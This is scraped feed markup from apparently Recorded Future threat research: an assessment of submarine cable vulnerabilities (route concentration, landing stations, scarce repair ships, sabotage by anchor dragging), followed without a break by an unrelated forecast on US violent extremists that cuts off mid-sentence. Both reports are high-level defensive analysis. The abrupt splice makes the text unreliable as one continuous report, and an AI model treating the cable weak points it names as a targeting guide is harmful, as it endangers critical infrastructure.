incidents in geographic chokepoints are relatively rare, each one brings much-needed attention to the vulnerability of similarly concentrated cables around the world.”</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"submarine-cables-003.png\" src=\"https://www.recordedfuture.com/media_19816d0558bd3859f3b151e6cea41387546caba6e.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1512\" height=\"844\" />\n            </div>\n          </div>\n          <div>\n            <div><em>Figure 3: Multiple cables convene at Abidjan, Côte d’Ivoire (Source:</em> <em><a href=\"https://www.fiberatlantic.com/cls/lVB5D9UVvZQ5HK3cexaE\">Fiber Atlantic</a>)</em></div>\n          </div>\n        </div>\n        <p><strong>The concentration of submarine cables at a single cable landing station</strong> <strong><a href=\"https://blog.telegeography.com/why-does-diversity-matter-for-submarine-cables\">increases</a></strong> <strong>the likelihood that damage to or near a landing site will impact multiple cables.</strong> These stations <a href=\"https://www.itu.int/en/ITU-D/Regional-Presence/AsiaPacific/SiteAssets/Pages/Events/2017/Submarine%20Cable/submarine-cables-for-Pacific-Islands-Countries/Cable%20Landing%20Stations%20SNCC.pdf\">provide</a> multiple functions, including supplying power to the cable and connecting it to terrestrial networks, and their locations are often <a href=\"https://www.kentik.com/blog/diving-deep-into-submarine-cables-undersea-lifelines-of-internet-connectivity/\">chosen</a> <a href=\"https://www.nato-pa.int/download-file?filename=/sites/default/files/2023-04/032%20STC%2023%20E%20-%20CRITICAL%20MARITIME%20INFRASTRUCTURE%20-%20FRIDBERTSSON%20REPORT.pdf\">based</a> on access to existing infrastructure or regulatory factors, rather than because they offer particularly high protection from natural disasters or physical threats, such as sabotage or surveillance. As a result, cables frequently cluster around or at the same landing site –– <a href=\"https://www.atlanticcouncil.org/wp-content/uploads/2021/09/Cyber-defense-across-the-ocean-floor-The-geopolitics-of-submarine-cable-security.pdf\">raising</a> the threat that sabotage or espionage operations could impact multiple cables at once by targeting landing stations. For example, according to the US FCC, landing sites on the southeastern US coast are <a href=\"https://transition.fcc.gov/bureaus/pshs/advisory/csric5/WG4A_Final_091416.pdf\">clustered</a> in three primary locations in Florida, with nearly all landing sites developed to support multiple submarine cables. In October 2022, cybersecurity company Zscaler <a href=\"https://trust.zscaler.com/zscloud.net/posts/12256\">warned</a> that cuts to multiple cables at landing stations in Marseille linking the city to Milan, Barcelona, and Lyon “impacted major cables with connectivity to Asia, Europe, US and potentially other parts of the world.” In August 2023, the European Union Agency for Cybersecurity (ENISA) <a href=\"https://www.enisa.europa.eu/publications/undersea-cables\">reported</a> that landing stations represent a weak point in the ecosystem due to their vulnerability to “espionage attacks, deliberate power cuts, sabotage attacks with explosives, or even missile attacks in the case of a military conflict.”</p>\n        <h4>Limited Repair Capacity Poses Long-Term Problem</h4>\n        <p><strong>Repair capacity, which continues to lag behind the expansion of submarine cable networks, almost certainly represents an underappreciated point of vulnerability in the submarine cable ecosystem.</strong> As cable systems have expanded dramatically, investment in ships that can service these cables has lagged behind, resulting in the growth of cable systems outpacing repair capacity. Most of these vessels are therefore focused on laying new cable systems, <a href=\"https://www.theverge.com/c/24070570/internet-cables-undersea-deep-repair-ships\">constraining</a> their ability to respond immediately to cable faults. According to <a href=\"https://www.enisa.europa.eu/publications/undersea-cables\">ENISA</a>, given the complex nature of repairs and limited repair capacity, “a coordinated attack against multiple subsea cables could have a major impact on global internet connectivity.” For example, the Léon Thévenin, a cable repair ship docked in Cape Town, South Africa, was the only vessel dedicated to serving Africa at the time of the March 2024 cable outages, extending the repair timeline. In February 2023, all five of Vietnam’s operational undersea cables <a href=\"https://e.vnexpress.net/news/news/vietnam-s-undersea-cable-malfunctions-right-after-getting-fixed-4623749.html\">suffered</a> partial or total damage at the same time, <a href=\"https://e.vnexpress.net/news/news/despite-promises-of-no-stagnation-vietnam-s-internet-access-struggles-during-peak-hours-4570205.html\">resulting</a> in the loss of 75% of its data transmission capacity. With nearby ships busy, repairs on all cables were not fully <a href=\"https://vietnamnet.vn/en/repairs-completed-on-five-broken-undersea-cables-linked-to-vietnam-2223445.html\">completed</a> until late November 2023, and telecommunications firms were <a href=\"https://manoa.hawaii.edu/indopacificaffairs/article/entangled-southeast-asia-and-the-geopolitics-of-undersea-cables/#:~:text=In%202022%20and%202023%2C%20all,transportation%20to%20ensure%20stable%20connections.\">forced</a> to purchase spare terrestrial capacity to help stabilize connections. Reflecting concerns regarding the limited availability of repair vessels, the US <a href=\"https://www.federalregister.gov/documents/2021/01/05/2020-29159/request-for-applications-to-be-considered-for-enrollment-in-the-cable-security-fleet\">established</a> the Cable Security Fleet in 2020 with two <a href=\"https://www.csis.org/analysis/safeguarding-subsea-cables-protecting-cyber-infrastructure-amid-great-power-competition\">dedicated</a> US-flagged cable repair ships (the CS Dependable and CS Decisive) to speed repairs to submarine cables relevant to US national security.</p>\n        <p><strong>Unless significant investments are made in streamlining repair processes and expanding cable ship repair capacity, repair times are likely to continue trending upward.</strong> According to <a href=\"https://subtelforum.com/submarine-telecoms-industry-report/\">SubTel Forum</a>, the average repair time for the restoration of cable faults has risen from 2015 to 2024, with the average repair time in 2023 consisting of 40 days. Vietnam’s five submarine cable systems, which account for most of its international bandwidth, <a href=\"https://subtelforum.com/aae-1-and-apg-cable-disruptions-impact-vietnams-internet/\">experience</a> an average of fifteen incidents annually; prior to 2022, repairs lasted one to two months per incident, but have recently lasted longer, extending disruptions. This is almost certainly a result of the increasing gap in the rates of subsea cable infrastructure expansion and stagnating repair capabilities.</p>\n        <h4>Regulatory Factors, Conflict, and Territorial Disputes Likely to Prolong Repair Timelines</h4>\n        <p><strong>Regulatory hurdles, such as complex and lengthy permitting processes for repair ships that vary by national territory, likely prolong repair timelines, exacerbating the impact of limited repair capacity. Cable damage in areas subject to territorial disputes and ongoing kinetic conflicts almost certainly increases the prospect of prolonged outages due to the denial of access to repair vessels.</strong> The International Institute for Strategic Studies <a href=\"https://www.iiss.org/cyber-power-matrix/submarine-cables-the-achilles-heel-of-cyberspace-in-the-asia-pacific/\">reports</a> that repairs in the Asia-Pacific region take up to 30 days on average from notification of an incident, compared to fifteen in North America, due to more stringent permitting requirements. For example, repairs to April 2024 damages to the SeaMeWe-5 cable in Indonesian waters, which <a href=\"https://www.capacitymedia.com/article/2d5m1eo5yohwx2zl557uo/news/indonesian-policy-delays-sea-me-we-5s-repair\">reduced</a> Bangladesh’s internet capacity by a third, were not <a href=\"https://www.facebook.com/photo?fbid=885023603650209&amp;set=a.308673981285177\">completed</a> until June 28, 2024, as Jakarta’s cabotage policy <a href=\"https://www.capacitymedia.com/article/2d5m1eo5yohwx2zl557uo/news/indonesian-policy-delays-sea-me-we-5s-repair\">delayed</a> repairs for several weeks. In March 2024, telecommunications provider SEACOM <a href=\"https://itweb.africa/content/O2rQGMAEyPGMd1ea\">reported</a> that it would likely take longer than expected to repair three cables in the Red Sea damaged by a ship hit by Houthi strikes since permitting could take up to eight weeks to obtain. The Yemeni government <a href=\"https://www.marineinsight.com/shipping-news/yemens-political-disputes-delay-full-repairs-of-3-submarine-internet-cables-in-the-red-sea/\">refused</a> to grant permission to initiate repairs of the damaged AAE-1 cable to the cable’s operating consortium, which includes telecommunications firm TeleYemen, as one of the firm’s two branches is under the control of the Houthi group. An investigation of the consortium reportedly <a href=\"https://gcaptain.com/damaged-subsea-cables-repaired-in-red-sea/\">delayed</a> repairs of the AAE-1 until July 2024. Further, SubTel Forum <a href=\"https://subtelforum.com/houthis-hit-underwater-communications-cables/\">reported</a> that ongoing threats posed by the Houthi group likely limited companies that agreed to carry out repairs and incurred high premiums.</p>\n        <p>Additionally, amid ongoing territorial disputes between China and the Philippines in the South China Sea, the China Coast Guard (the CCG) has attempted to block Philippine resupply operations to vessels at the Second Thomas Shoal, Scarborough Shoal, and Sabina Shoal. In addition to harassing Philippine vessels, the CCG and other Chinese forces have for decades <a href=\"https://www.nbr.org/publication/dynamics-of-assertiveness-in-the-south-china-sea-china-the-philippines-and-vietnam-1970-2015/\">interfered</a> with vessels from other claimants in the South China Sea, as well as vessels operated by outside powers like the United States. These incidents suggest that Beijing could take similar action to block repair vessels from accessing damaged submarine infrastructure in the event of a potential escalation of tension or outbreak of hostilities around Taiwan.</p>\n        <p>To read the entire analysis, <a href=\"https://assets.recordedfuture.com/insikt-report-pdfs/2025/ta-2025-0717.pdf\">click here</a> to download the report as a PDF.</p>\n      ","content:encodedSnippet":"Executive Summary\nEvents over the last eighteen months indicate that the risk environment for submarine cables has very likely escalated, and the threat of state-sponsored malicious activity targeting submarine cable infrastructure is likely to rise further amid heightened geopolitical tensions. Insikt Group’s assessment of the current risk environment for submarine cables aligns with the findings of our 2023 assessment, which highlighted the convergence of geopolitical, physical, and cyber threats. Based on an analysis of 44 publicly reported cable damages occurring in 32 distinct groupings in 2024 and 2025 (Appendix A), Insikt Group assesses that three factors in the submarine cable ecosystem –– lack of redundancy in cable networks, lack of diversity of cable routes, and limited global repair capacity –– very likely increase the likelihood of significant outages from damages. Regions with low redundancy, such as parts of West and Central Africa, isolated Pacific islands, and certain secondary European routes, are more likely to suffer disproportionate impact from cable damage, especially when geopolitical tensions coincide with infrastructure constraints.\nWhile accidents will very likely continue to cause the majority of day-to-day interruptions, recent incidents in the Baltic Sea and around Taiwan indicate that submarine cable systems remain vulnerable to threats such as anchor dragging, which states can use as a low-sophistication tactic to target adversaries’ critical infrastructure while maintaining plausible deniability. Insikt Group identified four incidents involving eight distinct cable damages in the Baltic Sea and five incidents involving five distinct cable damages around Taiwan in 2024 and 2025. At least five of these nine incidents were attributed to ships dragging their anchors, including four Russia- or China-linked vessels operating under suspicious circumstances or with opaque ownership structures, although the resulting investigations have highlighted the difficulty of attributing cable cuts to state-sponsored sabotage. Such campaigns attributed to Russia in the North Atlantic–Baltic region and China in the western Pacific are likely to increase in frequency as tensions rise, leveraging deniable tactics in both shallow and deep water to apply political pressure without overt escalation.\nWithout a significant expansion of dedicated repair vessels, repair capacity is very likely to lag behind demand, pushing median restoration times beyond the current 40‑day benchmark. National permitting delays and conflict zone access restrictions will likely extend repair times further, making streamlined diplomatic clearance processes an increasingly critical element of submarine cable resilience. Satellite and microwave links will almost certainly remain partial stop‑gaps, restoring only a fraction of lost bandwidth during major outages. To mitigate these challenges, joint public-private partnerships investing in repair and maintenance capabilities, improving real-time monitoring and security measures around submarine cable infrastructure, and conducting comprehensive stress tests are critical to improving resilience and guarding against a low-probability but high-impact event in which damages to multiple cables cause prolonged connectivity issues.\nKey Findings\nInsikt Group identified a total of 44 publicly reported cable damages in 2024 and 2025 occurring in 32 distinct groupings. Unknown causes accounted for the largest number of damages (31%), followed by anchor dragging (25%) and seismic activity or other natural phenomena (16%).\nOf the identified cable damages, three caused significant and prolonged outages. These cases indicate that three factors –– lack of redundancy, lack of diversity of cable routes, and limited repair capacity –– very likely raise the risk of severe impact from damages to submarine cables.\nInsikt Group identified four incidents in the Baltic Sea involving eight distinct submarine cable damages and five incidents around Taiwan involving five distinct submarine cable damages in 2024 and 2025, four of which involved China- or Russia-linked vessels with opaque ownership or suspicious maneuvers near the damaged cables.\nGeopolitical tensions –– namely, Russia’s war against Ukraine and China’s coercive actions toward Taiwan –– very likely remain the primary drivers of state-linked sabotage activity targeting submarine cables.\nJoint public-private partnerships promoting investment in cable repair and maintenance capabilities, enhancing security and surveillance of critical submarine infrastructure, and improving resilience in current and future cable networks will be critical to addressing rising threats to cable infrastructure.\nBackground\nThere are currently 597 subsea cables in operation or under construction as of April 2025, compared to 559 subsea cables in 2024. These cables account for an estimated 99% of international data traffic, representing critical infrastructure underpinning global telecommunications and financial flows. In 2024, 24 new cable systems came online, according to the Submarine Telecoms Forum (SubTel Forum) –– eight in the Europe-Middle East-Africa region, six in Oceania, four in the Indian Ocean, four in the Americas, and two transpacific systems.\nAmong commercial suppliers of cable systems, three companies –– France’s Alcatel, the US’s SubCom, and Japan’s NEC –– lead in the number of systems delivered, kilometers of cable produced, and future systems planned, although China’s HMN Technologies (Hengtong) is playing an increasing role. Between 2020 and 2024, Alcatel delivered 23 systems, SubCom delivered thirteen, NEC ten, and HMN seven. Alcatel, the largest player, is also involved in nine planned future cable systems, representing 39% of future projects, while NEC is involved in four (17%) and SubCom two (9%).\nThere are approximately 80 vessels globally dedicated to maintaining and expanding submarine cable infrastructure, with the United Kingdom’s (UK) Global Marine Systems (13%), France’s Orange Marine (13%), SubCom (11.6%), Alcatel Submarine Networks (ASN) (10%) and Malaysia’s Optic Marine Services (10%) owning the most vessels.\nFigure 1: Cable ship fleet distribution by company (Source: Submarine Telecoms Forum Industry Report 2024–2025: Issue 13)\nDamage to submarine cables is not uncommon, with an average of 150 to 200 faults occurring globally each year, according to the International Cable Protection Committee (ICPC). Most of these faults never reach the threshold of public reporting, since the majority do not cause detectable issues due to the availability of alternate routes for traffic. From 2015 to 2024, SubTel Forum identified a total of 237 publicized cable fault incidents globally –– likely a fraction of the total cable faults –– the vast majority of which were attributable to human activities, namely fishing and anchor dragging. Regionally, the “AustralAsia” region accounted for 36.3% of all reported faults during this period, making it the most fault-prone area, followed by Europe, the Middle East, and Africa (28.7%) and the Americas (20.3%) The ICPC reports that the most common cause of cable damage is a ship anchor or fishing equipment contacting a cable in depths of less than 200 meters. Undersea abrasion and natural phenomena –– such as underwater rockslides and seismic activity –– account for approximately 10% of faults.\nWhile cable faults are relatively common, they require significant resources to repair; the ICPC reports that cable repairs average between $1 and $3 million, require “specialized cable ships with highly trained crews,” and can take months to complete.\nSubmarine Cable Risk Environment\nSubmarine cable systems very likely continue to face an escalating risk environment, driven in part by increasing geopolitical tensions –– aligning with our July 2023 assessment. In 2024, SubTel Forum –– a leading industry platform for submarine cable analysis and reporting –– reported 46 incidents, the highest figure since it began publishing data on subsea cable faults in 2013 and a sharp uptick from the fifteen reported in 2023. This corresponds to heightened public awareness of submarine cable vulnerabilities amid several recent high-profile damages and related concerns about intentional malicious actions, such as sabotage –– although the increase may be partially attributable to increased reporting on subsea cable faults, as opposed to strictly reflecting an increase in incidents. However, most recent incidents have not resulted in prolonged connectivity disruptions.\nAn assessment of the three most impactful damages in 2024 and 2025 –– located in the Red Sea, West Africa, and South Africa –– indicates that the greatest threat to submarine cables is almost certainly where damages occur in areas with limited redundancy and repair capacity, regardless of whether the result of malicious targeting driven by geopolitical interests, unintentional human activity, or natural phenomena.\nMost Impactful Cable Damages of 2024–2025\nInsikt Group identified 44 publicly reported submarine cable damages occurring in 32 groupings in 2024 and 2025 (Appendix A). Of these, three cases caused damage to multiple submarine internet cables resulting in substantial and prolonged disruption to internet and telecommunications traffic. In each case, disruption to services resulted from damages to multiple submarine cables at once, with the most impacted countries lacking reliable alternative routes for traffic, exacerbated by limited repair capabilities and permitting issues that prolonged repair timelines.\nIn February 2024, a UK-owned vessel struck by a Houthi-fired missile sank in the Red Sea, damaging the Asia Africa Europe-1 (AAE-1), Europe India Gateway (EIG), and SEACOM cables and disrupting 25% of traffic between Asia, Europe, and the Middle East. According to Hong Kong telecommunications company HGC Global Communications, the damage caused “a significant impact on communication networks in the Middle East.”\nIn March 2024, an underwater rock slide damaged four submarine cables off West Africa: the West African Cable System (WACS), Africa Coast to Europe (ACE), MainOne, and SAT-3 cables. NetBlocks reported disruptions to internet connections in at least sixteen Central and West African countries, with disruptions to mobile payments and cloud applications for several days. CloudFlare reported a significant impact on a total of thirteen countries. In Liberia, disruptions lasted more than twelve hours. The outage also left multiple Nigerian banks offline, severely impacted connectivity in Ghana, and incurred estimated repair costs of $8 million.\nIn May 2024, damage to two cables off the coast of South Africa –– SEACOM and the Eastern Africa Submarine System (EASSy) –– significantly reduced connectivity between East and South Africa, and caused internet outages for Kenya and several other East African countries. According to Netblocks, the cut disrupted internet services in twelve countries, with Tanzania, Mozambique, and Malawi particularly affected.\nRisk Factors for Submarine Cable Systems\nThree primary factors –– lack of redundancy, lack of diversity of cable routes, and limited repair capacity –– very likely raise the likelihood of severe outages caused by damage to submarine cables. Additionally, permitting issues stemming from different regulatory environments and geopolitical tensions can extend the timeline for cable repairs, as can kinetic conflicts in the vicinity of cable breaks.\nLack of Redundancy\nJurisdictions with limited alternate options to reroute traffic are most vulnerable to prolonged or significant disruptions. Following the May 2024 damages to SEACOM and EASSy, Kenya rerouted traffic to the TEAMS cable, with Safaricom and Airtel reporting they had activated alternative connectivity, but Tanzania experienced greater disruption due to its fewer connectivity options (Figure 2). In this case, the earlier February 2024 Red Sea damages further limited alternate options for connectivity, with Microsoft stating that the two incidents together “had reduced the total network capacity for most of Africa’s regions.” By contrast, Cloudflare reported that two cable cuts in November 2024 in the Baltic Sea –– the BCS East-West Interlink connecting Sweden and Lithuania, and the C-Lion1 cable connecting Finland and Germany –– “resulted in little-to-no observable impact to the affected countries … in large part because of the significant redundancy and resilience of Internet infrastructure in Europe.” Highlighting the importance of redundancy measures, the European Commission reported in 2024 that “many islands in the Union, including the three island Member States [Cyprus, Ireland, and Malta], as well as the EU outermost regions and overseas countries and territories, are almost entirely dependent on such submarine cables for intra-Union communications,” indicating a likely higher level of vulnerability.\nFigure 2: Impact of May 2024 SEACOM and EASSy cable outages in East Africa (Source: NetBlocks)\nWhile satellites provide edge connectivity and connect locations that do not have easy access to physical infrastructure, they account for a small amount of overall global capacity and typically cannot replace fiber-optic submarine cables, which also move large amounts of data faster and more cheaply. TeleGeography reports that “cables can carry far more data at far less cost than satellites,” and only a small percentage of intercontinental data traffic is transmitted via satellite, according to Cloudflare. For example, the US Federal Communications Commission (FCC) reports that satellites account for just 0.37% of all US international capacity. According to the ICPC, “a trans-pacific fibre-optic call need only travel about 5,000 miles point-to-point,” compared to a satellite call, which must travel 22,235 miles from the Earth to a satellite and then another 22,235 back. Illustrating this, a backup microwave system was activated following damages to two submarine cables connecting Taiwan and the Matsu Islands in February 2023, but only restored an estimated 5% of the bandwidth that the cables had provided, with full internet access not restored until April 2023.\nLack of Diversity of Cable Routes\nDeploying submarine cables along similar geographic routes very likely increases systemic risk by creating single points of failure. Countries with multiple submarine cables routed along varying geographic routes are more insulated from major connectivity losses; conversely, those with fewer connecting cables, placed in close proximity to each other, are almost certainly more susceptible to multiple cable damages and associated disruptions. Recent incidents of damage to multiple cables at once indicate that threat actors could attempt to exploit the concentration of cables along similar routes in an effort to cause prolonged outages across a geographic area. For example, the Red Sea cable cuts in February 2024, detailed above, illustrated the importance of route diversity. The March 2024 damages to four cables off West Africa, which all occurred due to an underwater landslide in the “Le Trou Sans Fond” canyon off of Côte d’Ivoire, illustrated how a concentration of cables at one point can make multiple cables susceptible to human-made threats or, as in this case, natural phenomena (Figure 3). Similarly, Egypt is a critical internet chokepoint through which multiple submarine cables connecting Europe, Africa, and Asia run; the vulnerabilities associated with this arrangement were apparent following June 2022 damages to both the AAE-1 and the SeaMeWe-5 cables. In December 2024, the US Department of Homeland Security noted that “while incidents in geographic chokepoints are relatively rare, each one brings much-needed attention to the vulnerability of similarly concentrated cables around the world.”\nFigure 3: Multiple cables convene at Abidjan, Côte d’Ivoire (Source: Fiber Atlantic)\nThe concentration of submarine cables at a single cable landing station increases the likelihood that damage to or near a landing site will impact multiple cables. These stations provide multiple functions, including supplying power to the cable and connecting it to terrestrial networks, and their locations are often chosen based on access to existing infrastructure or regulatory factors, rather than because they offer particularly high protection from natural disasters or physical threats, such as sabotage or surveillance. As a result, cables frequently cluster around or at the same landing site –– raising the threat that sabotage or espionage operations could impact multiple cables at once by targeting landing stations. For example, according to the US FCC, landing sites on the southeastern US coast are clustered in three primary locations in Florida, with nearly all landing sites developed to support multiple submarine cables. In October 2022, cybersecurity company Zscaler warned that cuts to multiple cables at landing stations in Marseille linking the city to Milan, Barcelona, and Lyon “impacted major cables with connectivity to Asia, Europe, US and potentially other parts of the world.” In August 2023, the European Union Agency for Cybersecurity (ENISA) reported that landing stations represent a weak point in the ecosystem due to their vulnerability to “espionage attacks, deliberate power cuts, sabotage attacks with explosives, or even missile attacks in the case of a military conflict.”\nLimited Repair Capacity Poses Long-Term Problem\nRepair capacity, which continues to lag behind the expansion of submarine cable networks, almost certainly represents an underappreciated point of vulnerability in the submarine cable ecosystem. As cable systems have expanded dramatically, investment in ships that can service these cables has lagged behind, resulting in the growth of cable systems outpacing repair capacity. Most of these vessels are therefore focused on laying new cable systems, constraining their ability to respond immediately to cable faults. According to ENISA, given the complex nature of repairs and limited repair capacity, “a coordinated attack against multiple subsea cables could have a major impact on global internet connectivity.” For example, the Léon Thévenin, a cable repair ship docked in Cape Town, South Africa, was the only vessel dedicated to serving Africa at the time of the March 2024 cable outages, extending the repair timeline. In February 2023, all five of Vietnam’s operational undersea cables suffered partial or total damage at the same time, resulting in the loss of 75% of its data transmission capacity. With nearby ships busy, repairs on all cables were not fully completed until late November 2023, and telecommunications firms were forced to purchase spare terrestrial capacity to help stabilize connections. Reflecting concerns regarding the limited availability of repair vessels, the US established the Cable Security Fleet in 2020 with two dedicated US-flagged cable repair ships (the CS Dependable and CS Decisive) to speed repairs to submarine cables relevant to US national security.\nUnless significant investments are made in streamlining repair processes and expanding cable ship repair capacity, repair times are likely to continue trending upward. According to SubTel Forum, the average repair time for the restoration of cable faults has risen from 2015 to 2024, with the average repair time in 2023 consisting of 40 days. Vietnam’s five submarine cable systems, which account for most of its international bandwidth, experience an average of fifteen incidents annually; prior to 2022, repairs lasted one to two months per incident, but have recently lasted longer, extending disruptions. This is almost certainly a result of the increasing gap in the rates of subsea cable infrastructure expansion and stagnating repair capabilities.\nRegulatory Factors, Conflict, and Territorial Disputes Likely to Prolong Repair Timelines\nRegulatory hurdles, such as complex and lengthy permitting processes for repair ships that vary by national territory, likely prolong repair timelines, exacerbating the impact of limited repair capacity. Cable damage in areas subject to territorial disputes and ongoing kinetic conflicts almost certainly increases the prospect of prolonged outages due to the denial of access to repair vessels. The International Institute for Strategic Studies reports that repairs in the Asia-Pacific region take up to 30 days on average from notification of an incident, compared to fifteen in North America, due to more stringent permitting requirements. For example, repairs to April 2024 damages to the SeaMeWe-5 cable in Indonesian waters, which reduced Bangladesh’s internet capacity by a third, were not completed until June 28, 2024, as Jakarta’s cabotage policy delayed repairs for several weeks. In March 2024, telecommunications provider SEACOM reported that it would likely take longer than expected to repair three cables in the Red Sea damaged by a ship hit by Houthi strikes since permitting could take up to eight weeks to obtain. The Yemeni government refused to grant permission to initiate repairs of the damaged AAE-1 cable to the cable’s operating consortium, which includes telecommunications firm TeleYemen, as one of the firm’s two branches is under the control of the Houthi group. An investigation of the consortium reportedly delayed repairs of the AAE-1 until July 2024. Further, SubTel Forum reported that ongoing threats posed by the Houthi group likely limited companies that agreed to carry out repairs and incurred high premiums.\nAdditionally, amid ongoing territorial disputes between China and the Philippines in the South China Sea, the China Coast Guard (the CCG) has attempted to block Philippine resupply operations to vessels at the Second Thomas Shoal, Scarborough Shoal, and Sabina Shoal. In addition to harassing Philippine vessels, the CCG and other Chinese forces have for decades interfered with vessels from other claimants in the South China Sea, as well as vessels operated by outside powers like the United States. These incidents suggest that Beijing could take similar action to block repair vessels from accessing damaged submarine infrastructure in the event of a potential escalation of tension or outbreak of hostilities around Taiwan.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_190025b3a7ec156e3dde2306dfb29a45dd2f401c3.png?width=1200&format=pjpg&optimize=medium"},"content":"Explore the rising threats to global submarine cable networks amid escalating geopolitical tensions, sabotage incidents, and limited repair capacity.

These threats likely surpass the risk of DVE mass-casualty terrorist attacks due to their elevated frequency, success rate, and impact on the targeted entity’s operations. While certain categories of homegrown violent extremists (HVEs) and some DVEs will almost certainly continue to plan and threaten mass-casualty attacks, recent high-profile assassinations and assassination attempts in the US have very likely increased the probability of DVEs considering limited-scope methods. Violent extremists have almost certainly glorified the alleged perpetrators of these attacks and promoted narratives suggesting that targeted attacks against high-profile public figures more effectively achieve their political and ideological goals than mass-casualty attacks.</p>\n        <p>To support attack plots and bolster their operational footprint in 2025 and early 2026, HVEs and DVEs will almost certainly continue issuing online threats; stalking, harassing, and physically approaching victims; and conducting sabotage, surveillance, disruptive demonstrations, doxing, and swatting. As in previous years, personnel and facilities associated with racial, ethnic, and religious minorities, the LGBTQIA+ community, US federal, state, local, tribal, and territorial government agencies (particularly judicial and law enforcement agencies), specific private industry sectors (defense contractors, healthcare and pharmaceutical companies, financial and insurance agencies), and critical infrastructure providers are at heightened risk from HVE and DVE threat activities during the next twelve months.</p>\n        <p>Polarizing geopolitical and domestic political issues — especially conflicts in the Middle East involving Israel, the 2024 fall of the Bashar al-Assad regime in Syria, and US immigration enforcement policies — will almost certainly continue to mobilize HVEs and DVEs during the next twelve months. While expected tactics, techniques, and procedures (TTPs) associated with US violent extremists are unlikely to significantly change in the short term, DVEs and HVEs are very likely to accelerate adoption of new technologies, such as commercially available unmanned aerial vehicles (UAVs), generative artificial intelligence (AI), end-to-end encrypted communications platforms, cryptocurrencies, and 3D printing, to enhance their operational capabilities.</p>\n        <p>Rapidly shifting developments in the violent extremist threat landscape in the US and changing priorities of US federal law enforcement and homeland security agencies could place more of the onus on state and local governments and the private sector to manage their own counterterrorism programming. As always, facility security initiatives and hardening soft targets will undoubtedly remain important, but recent incidents and violent extremists’ growing preference for targeted attacks against high-profile personnel suggest that executive protection is an increasingly crucial aspect of countering violent extremist threats to organizations. Organizations can mitigate threats to executives not only through reactive detection of online threats and negative sentiment campaigns, but also by proactively identifying and removing publicly available information that can be used to target personnel. Physical security teams can query the Recorded Future Intelligence Cloud’s extensive corpus of sources used by violent extremists to analyze intelligence pertaining to these and other violent extremist threats.</p>\n        <h2>Key Findings</h2>\n        <p>During the next twelve months:</p>\n        <ul>\n          <li>The US will very likely face a heightened threat from violent extremist physical threat activities due to the enduring influence of the Israel-Hamas conflict; geopolitical developments in the Middle East, Central Asia, and Africa favoring foreign terrorist organizations (FTOs); and the increasing ease of access to and use of new and developing technologies.</li>\n          <li>While their preferred targets vary, most violent extremist threat actors are almost certainly interested in threatening US federal, state, and local governments. Critical infrastructure providers, defense contractors, and the education, insurance, healthcare, banking, finance, and maritime industry sectors also very likely face heightened risks.</li>\n          <li>Islamic State (IS) supporters will very likely represent the most lethal HVE threat to the US, especially if IS experiences a resurgence in Syria following the 2024 fall of the al-Assad government.</li>\n          <li>HVEs with a nexus to Hamas, Hezbollah, the Yemeni Houthis, Iraqi Shi’a militias, or other “Axis of Resistance” groups are unlikely to carry out attacks in the US, but they likely have increased motivation to do so and access to expanded facilitative resources due to the US’s direct involvement in the Iran-Israel conflict.</li>\n          <li>The DVE groups that likely pose the largest threat of conducting violent attacks in the US, such as neo-Nazi accelerationists, anti-government/anti-authority violent extremists (AGAAVEs) motivated by political animus, and anarchist violent extremists (AVEs), are likely to increasingly prefer targeted attacks and assassinations over mass-casualty attack plots.</li>\n          <li>Militia violent extremists (MVEs), AVEs, and AGAAVEs harboring political grievances due to US domestic political issues will almost certainly physically threaten judges, public officials, business executives, and other high–profile public figures.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>Insikt Group’s forecast is predicated on its assessments of open-source information on the activities of HVEs and DVEs in the US, including the Recorded Future Intelligence Cloud’s extensive index of HVE and DVE communications on various online platforms. During the past twelve months, Insikt Group researchers curated several hundred HVE and DVE sources, adding them to an extensive index of preexisting sources of this type.</p>\n        <p>This report defines “homegrown violent extremist,” “domestic violent extremist,” and several categories of HVEs and DVEs based on the US Intelligence Community’s <a href=\"https://www.dni.gov/files/ODNI/documents/assessments/UnclassSummaryofDVEAssessment-17MAR21.pdf\">definitions and categorizations</a> of threat actors. Periodically, this report prefers definitions adopted by Insikt Group subject matter experts for analytic utility, or in instances where the US government has not officially defined a particular phenomenon or movement. A full list of terms and definitions used in this report is available in <strong>Appendix A</strong>.</p>\n        <h2>Homegrown Violent Extremists</h2>\n        <p>HVEs are very likely to carry out physical threat activities targeting US government and law enforcement installations and personnel, public events, large commercial spaces, houses of worship and religious communities, and counter-protestors and demonstrators. US-based IS supporters will very likely present the most lethal violent extremist threat to the US during the next twelve months, and the continued mobilization factor of the Israel-Hamas conflict will almost certainly <a href=\"https://www.ic3.gov/PSA/2025/PSA250605-2\">drive</a> some Americans to provide support for IS, al-Qaeda, and other FTOs (although organizations other than IS and al-Shabaab — al-Qaeda’s Somalia franchise — very likely lack the infrastructure, personnel, and interest in recruiting US persons).</p>\n        <p>However, while sporadic escalations in the Israel-Hamas conflict will almost certainly <a href=\"https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2024-11/Pamphlet_compressed.pdf\">influence</a> disruptive protest activities and other physical threats in 2025, most visibly at US universities, threat actors will likely be deterred from overt displays of support for FTOs and plotting mass-casualty attacks due to the almost certain increase in law enforcement resources <a href=\"https://www.justice.gov/opa/pr/justice-department-announces-launch-joint-task-force-october-7\">dedicated</a> to investigating and prosecuting these threats. Instead, extant pro-Hamas networks in the US are very likely to <a href=\"https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure\">emphasize</a> covert operations, especially those that finance the organization.</p>\n        <p>In addition, the geopolitical climate likely <a href=\"https://www.reuters.com/world/middle-east/new-orleans-attack-puts-spotlight-islamic-state-comeback-bid-2025-01-03/\">favors</a> efforts by IS and al-Qaeda affiliates in the Levant, Central Asia, the Sahel, and the Horn of Africa to expand their territorial holdings, <a href=\"https://www.dni.gov/files/ODNI/documents/assessments/ATA-2025-Unclassified-Report.pdf\">conduct</a> increasingly sophisticated and lethal attacks in their areas of operations, and <a href=\"https://www.understandingwar.org/backgrounder/islamic-state%E2%80%99s-global-long-game-and-resurgence-syria-poses-evolved-threat-west\">develop</a> connections between their operatives and recruitment networks in Western Europe and North America.</p>\n        <p>Expanding commercial markets and ease of use of developing technologies — particularly UAVs and cryptocurrencies — are very likely to bolster HVE operations on behalf of a range of 